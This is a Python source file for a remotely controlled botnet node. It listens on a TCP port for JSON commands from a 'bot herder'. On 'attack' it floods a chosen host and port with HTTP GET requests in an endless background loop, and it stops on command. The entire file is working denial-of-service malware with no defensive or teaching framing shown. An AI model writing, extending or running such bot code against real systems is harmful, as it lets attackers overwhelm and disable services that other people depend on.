#!/usr/bin/env python3

import socket
import json
import threading
import requests

class Dos:
    def __init__(self):
        self._targetAddr = ''
        self._targetPort = 0
    
    @property
    def targetAddr(self):
        return self._targetAddr
    
    @targetAddr.setter
    def targetAddr(self, value):
        self._targetAddr = value
    
    @property
    def targetPort(self):
        return self._targetPort
    
    @targetPort.setter
    def targetPort(self, value):
        self._targetPort = value
      
    def stop(self):
        self._running = False

    def run(self):
        url = f'http://{self._targetAddr}:{self._targetPort}'
        self._running = True
        try:
            while self._running:
                requests.get(url)
        except:
            print(f'Host {url} unreachable')

def parse(receive, conn, addrHerder, addressBot, dos):
    try:
        response = ''
        if receive == 'attack':
            response = f'Start attack by bot {addressBot}'
            threading.Thread(target=dos.run, daemon=True).start()
        elif receive == 'stop':
            response = f'Stop attack by bot {addressBot}'
            dos.stop()
        elif receive == 'close':
            response = f'Close connection by bot {addressBot}'
    except:
        print(f'Connection refused by bot herder {addrHerder}!')
    finally:
        conn.send(bytes(response, 'UTF-8'))

def start_listening(address):
    receive = ''
    dos = Dos()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(address)
        s.listen()
        print('Start listening')
        while receive != 'close':
            conn, addr = s.accept()
            with conn:
                print(f'Connected by {addr}')
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    rec = json.loads(str(data, 'UTF-8'))
                    print(rec)
                    receive = rec['action']
                    dos.targetAddr = rec['targetAddr']
                    dos.targetPort= rec['targetPort']
                    parse(receive, conn, addr, address, dos)

def main():
    address = (socket.gethostname(), 9999)
    start_listening(address)
   
if __name__ == '__main__':
    main()
